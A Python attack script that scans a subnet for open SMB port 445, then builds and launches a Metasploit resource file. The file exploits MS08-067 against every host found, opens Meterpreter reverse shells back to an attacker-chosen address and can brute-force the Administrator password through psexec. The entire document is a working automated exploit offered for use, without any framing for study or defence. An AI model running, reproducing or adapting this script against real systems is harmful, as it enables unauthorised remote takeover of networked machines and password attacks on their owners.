import os
import sys
import argparse
import nmap

def find_targets(subnet):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(subnet, '445')
    target_hosts = []
    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]['tcp'][445]['state']
            if state == 'open':
                print(f'[+] Found Target Host: {host}')
                target_hosts.append(host)
    return target_hosts

def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write(f'set payload windows/meterpreter/reverse_tcp\n')
    config_file.write(f'set LPORT {lport}\n')
    config_file.write(f'set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')

def conficker_exploit(config_file, tgt_host, lhost, lport):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
    config_file.write(f'set RHOST {tgt_host}\n')
    config_file.write(f'set payload windows/meterpreter/reverse_tcp\n')
    config_file.write(f'set LPORT {lport}\n')
    config_file.write(f'set LHOST {lhost}\n')
    config_file.write('exploit -j -z\n')

def smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    username = 'Administrator'
    with open(passwd_file, 'r') as pf:
        for password in pf:
            password = password.strip()
            config_file.write('use exploit/windows/smb/psexec\n')
            config_file.write(f'set SMBUser {username}\n')
            config_file.write(f'set SMBPass {password}\n')
            config_file.write(f'set RHOST {tgt_host}\n')
            config_file.write(f'set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {lport}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')

def main():
    parser = argparse.ArgumentParser(description='MS08-067 Exploit Script')
    parser.add_argument('-H', dest='tgt_host', required=True, help='specify the target address[es]')
    parser.add_argument('-p', dest='lport', default='1337', help='specify the listen port')
    parser.add_argument('-l', dest='lhost', required=True, help='specify the listen address')
    parser.add_argument('-F', dest='passwd_file', help='password file for SMB brute force attempt')
    
    args = parser.parse_args()
    
    config_file_path = 'meta.rc'
    with open(config_file_path, 'w') as config_file:
        tgt_hosts = find_targets(args.tgt_host)
        setup_handler(config_file, args.lhost, args.lport)
        for tgt_host in tgt_hosts:
            conficker_exploit(config_file, tgt_host, args.lhost, args.lport)
            if args.passwd_file:
                smb_brute(config_file, tgt_host, args.passwd_file, args.lhost, args.lport)
    
    os.system(f'msfconsole -r {config_file_path}')

if __name__ == '__main__':
    main()
